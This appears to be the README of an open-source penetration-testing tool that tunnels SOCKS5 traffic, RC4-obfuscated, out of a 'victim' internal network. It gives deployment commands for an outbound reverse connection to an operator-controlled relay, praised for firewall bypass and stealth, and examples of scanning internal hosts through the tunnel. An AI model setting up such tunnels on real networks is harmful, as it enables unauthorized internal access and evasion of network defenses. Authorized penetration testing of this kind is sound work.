# Pivot Internal Tool

A SOCKS5 proxy tool with RC4 encryption for internal network pivoting, now with **Agent Server** support for enhanced network traversal.

## Overview

This tool now supports three modes of operation:
- **Server**: Runs on the target internal network (victim)
- **Agent**: Acts as a relay server between victim and multiple clients
- **Client**: Provides local SOCKS5 proxy that connects through the agent

## Architecture Options

### Traditional Direct Architecture (Original)

Direct connection between clients and server:

```
Client Machine 1                Internal Network
[Local SOCKS5]                  [Target Services]
192.168.1.1:1081 ----\                  ^
                      \                 |
Client Machine 2       RC4 Encrypted   |
[Local SOCKS5]        Connection    [Server]
192.168.1.2:1081 ----/             :1080
                     /                  |
Client Machine N    /                   |
[Local SOCKS5] ----/                    v
192.168.1.N:1081              [Internal Resources]

Multiple Clients              Single Server
```

### New Agent Server Architecture (Supplement)

The agent server enables a more flexible deployment where the victim server connects out to an external agent, which then serves multiple clients:

```
Internal Network    Agent Server         Client Machines
[Victim Server] <--RC4--> [Agent] <--RC4--> [Client 1 SOCKS5]
      |                    :1080             :1081
      |                     |
   [Internal]               |          <--RC4--> [Client 2 SOCKS5]
   [Resources]              |                    :1082
                           :8000
                            |          <--RC4--> [Client N SOCKS5]
                    [Victim Connection]          :108N
```

## Usage

### Traditional Mode (Direct Connection - Original)

This is the original architecture where clients connect directly to the server.

#### Server Mode
Run this on the internal network machine:
```bash
./pivot-internal server -key secret -l :1080
```

Options:
- `-key`: Encryption key (must match client)
- `-l`: Listen address and port

#### Client Mode
Run this on your local machine(s):
```bash
./pivot-internal client -key secret -r 10.10.10.10:1080 -l :1081
```

Options:
- `-key`: Encryption key (must match server)
- `-r`: Remote server address
- `-l`: Local SOCKS5 proxy listen address

### Agent Mode (New - Reverse Connection Architecture)

This new architecture allows the victim to connect out to an external agent, which is useful when the internal network has outbound connectivity but strict inbound filtering.

**Key Features:**
- **Victim makes outbound connection only** - No listening ports exposed on internal network
- **Agent acts as relay** between victim and multiple clients
- **Dual-port victim design**: Control connection (port 8000) + Local SOCKS5 server (port 9999, agent-only access)
- **All traffic RC4 encrypted** throughout the entire chain

**Network Flow:**
```
Client → Agent (:1080) → Victim Local SOCKS5 (:9999) → Internal Network
         ↑ Control Conn ↑              ↑ RC4 Encrypted ↑
         Victim (:8000)
```

#### 1. Agent Server (External/Public Server)
Run this on a public server accessible by both victim and clients:
```bash
./pivot-internal agent -key troller123 -l :1080 -i :8000
```

Options:
- `-key`: Encryption key (must match all components)
- `-l`: Listen address for client connections
- `-i`: Internal listen address for victim server connections

#### 2. Victim Server (Internal Network)
Run this on the internal network machine (connects to agent):
```bash
./pivot-internal server -key troller123 -c 103.12.0.1:8000
```

**Important:** The victim server will:
- Connect to agent on port 8000 (control connection)
- Start a local SOCKS5 server on port 9999 (only accessible by agent)
- Handle SOCKS5 requests and access internal network resources
- **No external ports are opened** - victim only makes outbound connections

Options:
- `-key`: Encryption key (must match agent)
- `-c`: Agent server address to connect to

#### 3. Client(s) (Your Local Machines)
Run multiple clients connecting to the agent:

Client 1:
```bash
./pivot-internal client -key troller123 -r 103.12.0.1:1080 -l :1081
```

Client 2:
```bash
./pivot-internal client -key troller123 -r 103.12.0.1:1080 -l :1082
```

Options:
- `-key`: Encryption key (must match agent)
- `-r`: Agent server address
- `-l`: Local SOCKS5 proxy listen address

### Using the Proxy
Once the client is running, configure your applications to use the SOCKS5 proxy at `127.0.0.1:1081`.

Examples:
```bash
# Using curl with SOCKS5 proxy
curl --socks5 127.0.0.1:1081 http://internal-server.local

# Using proxychains
echo "socks5 127.0.0.1 1081" >> /etc/proxychains.conf
proxychains nmap -sT internal-network.local

# Browser configuration
# Configure your browser to use SOCKS5 proxy: 127.0.0.1:1081
```

## Building

### Local Build
```bash
go build -o pivot-internal
```

### Cross-Platform Build
Use the provided build script for multiple platforms:
```bash
chmod +x build.sh
./build.sh
```

### Docker Build
Build Docker image locally:
```bash
# Build for current platform
docker build -t pivot-internal .

# Build for multiple platforms
docker buildx build --platform linux/amd64,linux/arm64 -t pivot-internal .
```

### GitHub Actions Automated Builds

This project includes comprehensive GitHub Actions workflows that automatically:

#### 1. **Build and Test** (Triggered on push/PR)
- Runs tests and builds binaries for all supported platforms
- Creates artifacts for Windows (amd64, 386), macOS (amd64, arm64), and Linux (amd64, arm64)
- Artifacts are available for download from the Actions tab

#### 2. **Docker Image Build** (Triggered on push to main, tags, and PRs)
- Automatically builds and pushes Docker images to GitHub Container Registry (GHCR)
- Multi-platform Docker images (linux/amd64, linux/arm64)
- Images are tagged based on branch/tag names
- Available at: `ghcr.io/hypnguyen1209/pivot-internal`

#### 3. **Release Creation** (Triggered on version tags)
- Creates GitHub releases with cross-platform binaries
- Includes SHA256 checksums for security verification
- Automatically generates release notes

#### 4. **Security Scanning** (Runs on push/PR and weekly)
- Vulnerability scanning with `govulncheck`
- Security analysis with `gosec`
- Dependency checking with `nancy`

### Using Pre-built Docker Images

Pull the latest Docker image:
```bash
docker pull ghcr.io/hypnguyen1209/pivot-internal:latest
```

Run server in Docker:
```bash
docker run -p 1080:1080 ghcr.io/hypnguyen1209/pivot-internal:latest ./pivot-internal server -key secret -l :1080
```

Run client in Docker:
```bash
docker run -p 1081:1081 ghcr.io/hypnguyen1209/pivot-internal:latest ./pivot-internal client -key secret -r server-ip:1080 -l :1081
```

### Creating a Release

To trigger an automated release with binaries:
```bash
git tag v1.0.0
git push origin v1.0.0
```

This will automatically:
- Build binaries for all supported platforms
- Create a GitHub release with download links
- Generate checksums for security verification
- Push Docker images with version tags

## Features

- ✅ **Dual Architecture Support**: Traditional direct connection + New agent-based reverse connection
- ✅ SOCKS5 proxy protocol support
- ✅ RC4 encryption for traffic obfuscation
- ✅ IPv4, IPv6, and domain name resolution
- ✅ **Multiple concurrent clients** support (both architectures)
- ✅ **Connection tracking and logging** with unique IDs
- ✅ **Graceful shutdown** with signal handling (Ctrl+C)
- ✅ **Reverse connection capability** for restrictive network environments
- ✅ Cross-platform support (Windows, Linux, macOS)
- ✅ **Concurrent connection handling** per client

## Security Notes

- RC4 is used for encryption. While not the strongest encryption, it provides good obfuscation for network traffic
- Ensure your encryption key is strong and kept secret
- This tool is designed for authorized penetration testing and internal network assessment only

## Example Workflow

### Example Workflow Comparison

#### Traditional Direct Connection Workflow

1. **Deploy server on internal network (10.10.10.10)** - Server listens for incoming connections:
   ```bash
   ./pivot-internal server -key MySecretKey123 -l :1080
   ```

2. **Connect clients from external machines**:
   ```bash
   # Client 1
   ./pivot-internal client -key MySecretKey123 -r 10.10.10.10:1080 -l :1081
   
   # Client 2  
   ./pivot-internal client -key MySecretKey123 -r 10.10.10.10:1080 -l :1082
   ```

#### Agent-Based Reverse Connection Workflow

1. **Deploy agent server on public VPS (103.12.0.1)** - Agent waits for victim and clients:
   ```bash
   ./pivot-internal agent -key MySecretKey123 -l :1080 -i :8000
   ```

2. **Deploy victim server on internal network** - Victim connects out to agent:
   ```bash
   ./pivot-internal server -key MySecretKey123 -c 103.12.0.1:8000
   ```

3. **Connect clients to agent from external machines**:
   ```bash
   # Client 1
   ./pivot-internal client -key MySecretKey123 -r 103.12.0.1:1080 -l :1081
   
   # Client 2
   ./pivot-internal client -key MySecretKey123 -r 103.12.0.1:1080 -l :1082
   ```

### Testing the Setup

#### Agent Mode Test Commands
```bash
# Test with curl through the proxy chain
curl -x socks5h://127.0.0.1:1081 https://1.1.1.1/cdn-cgi/trace -v

# Test internal network access (example)
curl -x socks5h://127.0.0.1:1081 http://internal-server.local/

# Test with multiple clients simultaneously
curl -x socks5h://127.0.0.1:1081 https://httpbin.org/ip &
curl -x socks5h://127.0.0.1:1082 https://httpbin.org/ip &
```

#### Traditional Mode Test Commands
```bash
# Test direct connection
curl -x socks5h://127.0.0.1:1081 https://1.1.1.1/cdn-cgi/trace -v
```

### Troubleshooting

**Common Issues:**

1. **"No victim server connected"** - Ensure victim server is running and connected to agent
2. **"Connection refused"** - Check firewall settings and port availability
3. **RC4 encryption errors** - Ensure all components use the same encryption key
4. **SOCKS5 proxy errors** - Verify client application supports SOCKS5h (DNS resolution through proxy)

**Log Analysis:**
- Agent logs show client and victim connections
- Victim logs show SOCKS5 request handling
- Client logs show proxy server status

### When to Use Each Architecture

**Use Traditional Mode when:**
- You have direct network access to the internal network
- The internal network allows inbound connections
- Simple setup with fewer components

**Use Agent Mode when:**
- The internal network has strict inbound filtering but allows outbound connections
- You need a public staging point for multiple operators
- The victim machine can initiate outbound connections to your controlled server
- You want centralized logging and connection management

## Architecture Comparison

| Feature | Traditional Mode | Agent Mode |
|---------|------------------|------------|
| **Victim Network Requirements** | Must accept inbound connections | Only needs outbound connectivity |
| **Firewall Bypass** | Limited | Excellent (outbound-only) |
| **Setup Complexity** | Simple (2 components) | Moderate (3 components) |
| **Scalability** | Good | Excellent |
| **Centralized Management** | No | Yes (through agent) |
| **Stealth** | Moderate | High (no listening ports on victim) |
| **Single Point of Failure** | Victim server | Agent server |
| **Use Case** | Direct access scenarios | Restrictive network environments |

## Port Summary

### Traditional Mode
- **Server**: Listens on specified port (e.g., :1080)
- **Client**: Connects to server, provides local SOCKS5

### Agent Mode  
- **Agent**: Listens on client port (:1080) and victim port (:8000)
- **Victim**: Connects to agent (:8000), runs local SOCKS5 (:9999)
- **Client**: Connects to agent (:1080), provides local SOCKS5
